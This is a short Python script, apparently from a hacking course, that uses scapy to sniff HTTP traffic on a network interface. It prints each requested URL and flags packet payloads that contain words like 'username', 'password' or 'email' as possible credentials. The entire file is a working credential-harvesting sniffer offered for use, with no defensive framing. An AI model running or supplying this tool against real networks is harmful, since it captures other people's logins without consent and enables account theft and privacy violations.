#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_user_info(packet):
    if packet.haslayer(scapy.Raw):
        # Raw layer contain user/pswd
        keywords = ["username", "user", "login", "password", "email", "pass"]
        load = str(packet[scapy.Raw].load)
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        #all info in mess
        #print(packet.show())
        url = get_url(packet)
        print("[+] Http Request >> " + url.decode())
        user_info = get_user_info(packet)
        if user_info:
            print("\n\n Possible user/pass" + user_info + "\n\n")

sniff("eth0") 
